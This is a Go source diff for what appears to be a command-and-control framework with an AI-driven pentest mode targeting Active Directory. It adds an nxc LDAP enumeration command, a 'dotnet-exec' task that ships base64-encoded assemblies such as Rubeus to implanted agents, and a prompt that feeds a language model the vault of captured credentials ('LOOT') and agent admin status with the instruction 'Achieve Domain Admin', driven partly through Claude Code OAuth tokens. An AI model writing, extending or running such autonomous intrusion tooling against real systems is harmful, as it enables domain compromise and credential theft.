@@ -2,10 +2,13 @@ package client
 
 import (
 	"context"
+	"encoding/base64"
 	"encoding/json"
 	"fmt"
 	"net/http"
+	"os"
 	"os/exec"
+	"path/filepath"
 	"strings"
 	"sync"
 	"time"
@@ -205,6 +208,8 @@ func translateTool(parts []string) (string, bool) {
 			}
 		}
 		return fmt.Sprintf("impacket-GetADUsers %s %s 2>&1", allFlag, target), true
+	case "getadcomputers":
+		return fmt.Sprintf("nxc ldap %s -u '%s' -p '%s' -d '%s' --computers 2>&1", ip, user, pass, domain), true
 	case "finddelegation":
 		return fmt.Sprintf("impacket-findDelegation %s 2>&1", target), true
 	case "getlaps":
@@ -496,6 +501,27 @@ func (s *aiGUISession) execCmd(cmdLine string) string {
 				return "[error: socks <port>]"
 			}
 			return s.execAgent("SOCKS_START", args[0])
+		case "dotnet-exec":
+			if len(args) == 0 {
+				return "[error: dotnet-exec <assembly.exe> [args...]]"
+			}
+			asmPath := args[0]
+			asmArgs := args[1:]
+			// If just a filename (no path separator), look in data/uploads/
+			if !strings.ContainsAny(asmPath, "/\\") {
+				candidate := filepath.Join("data", "uploads", asmPath)
+				if _, statErr := os.Stat(candidate); statErr == nil {
+					asmPath = candidate
+				}
+			}
+			asmData, readErr := os.ReadFile(asmPath)
+			if readErr != nil {
+				return fmt.Sprintf("[error reading %s: %v — upload it first]", asmPath, readErr)
+			}
+			asmB64 := base64.StdEncoding.EncodeToString(asmData)
+			taskArgs := fmt.Sprintf(`{"asm":%q,"args":%q,"type":"","method":""}`,
+				asmB64, strings.Join(asmArgs, " "))
+			return s.execAgent("DOTNET_EXEC", taskArgs)
 		}
 	}
 
@@ -530,17 +556,59 @@ func (s *aiGUISession) run(target, domain, model, ollamaURL, provider, apiKey st
 	if s.agentID != "" {
 		for _, a := range agents {
 			if a.ID == s.agentID {
-				agentNote = fmt.Sprintf("Active agent: %s@%s (ID: %s, transport: %s)",
-					a.Username, a.Hostname, s.agentID[:8], a.Transport)
+				priv := "user"
+				if a.IsAdmin {
+					priv = "ADMIN"
+				}
+				agentNote = fmt.Sprintf("Active agent: %s@%s [%s] (ID: %s, transport: %s)",
+					a.Username, a.Hostname, priv, s.agentID[:8], a.Transport)
 			}
 		}
 	}
 
+	credCtx := s.ctxCreds()
+	listenerCtx := s.ctxJobs()
+	targetCtx := s.ctxTargets()
+	uploadCtx := s.ctxUploads()
+	agentListCtx := s.ctxAgents(agents)
+
+	initialCtx := fmt.Sprintf(`TARGET IP:  %s
+DOMAIN:     %s
+
+LISTENERS:
+%s
+AGENTS:
+%s
+%s
+
+LOOT — CREDENTIALS IN VAULT:
+%s
+
+DISCOVERED TARGETS/NETWORK:
+%s
+
+UPLOADED ASSEMBLIES (available for dotnet-exec):
+%s`, target, domain, listenerCtx, agentListCtx, agentNote,
+		credCtx,
+		func() string {
+			if targetCtx == "" {
+				return "None yet — use scan to discover."
+			}
+			return targetCtx
+		}(),
+		func() string {
+			if uploadCtx == "" {
+				return "None — upload with: upload /tmp/Rubeus.exe"
+			}
+			return uploadCtx
+		}(),
+	)
+
 	msgs := []ollamaMsg{
 		{Role: "system", Content: aiAutoSystemPrompt},
 		{Role: "user", Content: fmt.Sprintf(
-			"TARGET IP: %s\nDOMAIN: %s\n%s\n\nStart the pentest. Achieve Domain Admin.",
-			target, domain, agentNote,
+			"INITIAL CONTEXT:\n%s\n\nStart the pentest now. Target: %s domain %s. Achieve Domain Admin.",
+			initialCtx, target, domain,
 		)},
 	}
 
@@ -665,6 +733,152 @@ func (s *aiGUISession) run(target, domain, model, ollamaURL, provider, apiKey st
 	s.emit("phase", fmt.Sprintf("Max iterations (%d) reached.", aiMaxIter))
 }
 
+// ── context helpers for run() ────────────────────────────────────────────────
+
+func (s *aiGUISession) ctxAgents(agents []*server.Agent) string {
+	if len(agents) == 0 {
+		return "No agents connected."
+	}
+	var sb strings.Builder
+	fmt.Fprintf(&sb, "%-8s  %-15s  %-20s  %-15s  %-6s  %-8s  %-7s  %s\n",
+		"ID", "HOSTNAME", "USER", "IP", "TRANSP", "OS", "ADMIN", "STATUS")
+	for _, a := range agents {
+		id := a.ID
+		if len(id) > 8 {
+			id = id[:8]
+		}
+		status := "active"
+		if server.IsStale(a) || !a.Active {
+			status = "stale"
+		}
+		admin := "no"
+		if a.IsAdmin {
+			admin = "YES"
+		}
+		osName := a.OS
+		if osName == "" {
+			osName = "windows"
+		}
+		fmt.Fprintf(&sb, "%-8s  %-15s  %-20s  %-15s  %-6s  %-8s  %-7s  %s\n",
+			id, a.Hostname, a.Username, a.IP, a.Transport, osName, admin, status)
+	}
+	return sb.String()
+}
+
+func (s *aiGUISession) ctxCreds() string {
+	raw, err := s.client.ListCreds("")
+	if err != nil {
+		return "Error getting credentials."
+	}
+	type cred struct {
+		Type     string `json:"type"`
+		Domain   string `json:"domain"`
+		Username string `json:"username"`
+		Secret   string `json:"secret"`
+		Host     string `json:"host"`
+		Source   string `json:"source"`
+	}
+	var creds []cred
+	if json.Unmarshal(raw, &creds) != nil || len(creds) == 0 {
+		return "No credentials in vault."
+	}
+	var sb strings.Builder
+	fmt.Fprintf(&sb, "%-8s  %-20s  %-20s  %-40s  %s\n", "TYPE", "DOMAIN\\USER", "HOST", "SECRET", "SOURCE")
+	for _, c := range creds {
+		user := c.Username
+		if c.Domain != "" {
+			user = c.Domain + "\\" + c.Username
+		}
+		secret := c.Secret
+		if len(secret) > 40 {
+			secret = secret[:40]
+		}
+		fmt.Fprintf(&sb, "%-8s  %-20s  %-20s  %-40s  %s\n", c.Type, user, c.Host, secret, c.Source)
+	}
+	return sb.String()
+}
+
+func (s *aiGUISession) ctxJobs() string {
+	raw, err := s.client.Jobs()
+	if err != nil {
+		return "No listeners."
+	}
+	var jobs []*server.Job
+	json.Unmarshal(raw, &jobs)
+	if len(jobs) == 0 {
+		return "No active listeners."
+	}
+	var sb strings.Builder
+	fmt.Fprintf(&sb, "%-4s  %-10s  %-6s  %s\n", "ID", "PROTO", "PORT", "STATUS")
+	for _, j := range jobs {
+		fmt.Fprintf(&sb, "%-4d  %-10s  %-6d  %s\n", j.ID, j.Protocol, j.Port, j.Status)
+	}
+	return sb.String()
+}
+
+func (s *aiGUISession) ctxTargets() string {
+	raw, err := s.client.ListTargets()
+	if err != nil {
+		return ""
+	}
+	type target struct {
+		IP       string `json:"ip"`
+		Hostname string `json:"hostname"`
+		OS       string `json:"os"`
+		Status   string `json:"status"`
+		Tags     string `json:"tags"`
+		Notes    string `json:"notes"`
+	}
+	var targets []target
+	if json.Unmarshal(raw, &targets) != nil || len(targets) == 0 {
+		return ""
+	}
+	var sb strings.Builder
+	fmt.Fprintf(&sb, "%-16s  %-20s  %-12s  %-10s  %s\n", "IP", "HOSTNAME", "OS", "STATUS", "NOTES/TAGS")
+	for _, t := range targets {
+		info := t.Tags
+		if t.Notes != "" {
+			if info != "" {
+				info += " | "
+			}
+			info += t.Notes
+		}
+		fmt.Fprintf(&sb, "%-16s  %-20s  %-12s  %-10s  %s\n", t.IP, t.Hostname, t.OS, t.Status, info)
+	}
+	return sb.String()
+}
+
+func (s *aiGUISession) ctxUploads() string {
+	raw, err := s.client.ListUploads()
+	if err != nil {
+		return ""
+	}
+	type upload struct {
+		AgentID  string `json:"agent_id"`
+		Filename string `json:"filename"`
+		Size     int64  `json:"size"`
+	}
+	var uploads []upload
+	if json.Unmarshal(raw, &uploads) != nil || len(uploads) == 0 {
+		return ""
+	}
+	seen := map[string]bool{}
+	var sb strings.Builder
+	for _, u := range uploads {
+		if seen[u.Filename] {
+			continue
+		}
+		seen[u.Filename] = true
+		hint := asmHint(u.Filename)
+		if hint != "" {
+			fmt.Fprintf(&sb, "  %-30s  %s\n", u.Filename, hint)
+		} else {
+			fmt.Fprintf(&sb, "  %s\n", u.Filename)
+		}
+	}
+	return sb.String()
+}
+
 func (p *guiProxy) handleAIPentest(w http.ResponseWriter, r *http.Request) {
 	w.Header().Set("Content-Type", "application/json")
 	switch r.Method {
@@ -728,6 +942,14 @@ func (p *guiProxy) handleAIPentest(w http.ResponseWriter, r *http.Request) {
 			globalAISess.mu.Unlock()
 			http.Error(w, `{"error":"api_key requerida para Claude"}`, 400)
 			return
+		}
+		if provider == "claude-code" {
+			tok, _, tokErr := loadClaudeCodeToken()
+			if tokErr != nil || tok == "" {
+				globalAISess.mu.Unlock()
+				http.Error(w, `{"error":"Claude Code OAuth no disponible — ejecuta: claude login"}`, 400)
+				return
+			}
 		}
 		if provider == "ollama" {
 			available := ollamaListModels(ollamaURL)
@@ -819,6 +1041,22 @@ func (p *guiProxy) handleAIStep(w http.ResponseWriter, r *http.Request) {
 	default:
 		http.Error(w, `{"error":"no step pending"}`, 400)
 	}
+}
+
+// handleClaudeAuth returns whether Claude Code OAuth credentials are present and valid.
+func (p *guiProxy) handleClaudeAuth(w http.ResponseWriter, r *http.Request) {
+	w.Header().Set("Content-Type", "application/json")
+	tok, exp, err := loadClaudeCodeToken()
+	if err != nil || tok == "" {
+		json.NewEncoder(w).Encode(map[string]any{"available": false})
+		return
+	}
+	expired := exp > 0 && time.Now().UnixMilli() > exp
+	if expired {
+		json.NewEncoder(w).Encode(map[string]any{"available": false, "reason": "token_expired"})
+		return
+	}
+	json.NewEncoder(w).Encode(map[string]any{"available": true})
 }
 
 // handleOllamaURL returns the effective Ollama URL as the Go client sees it
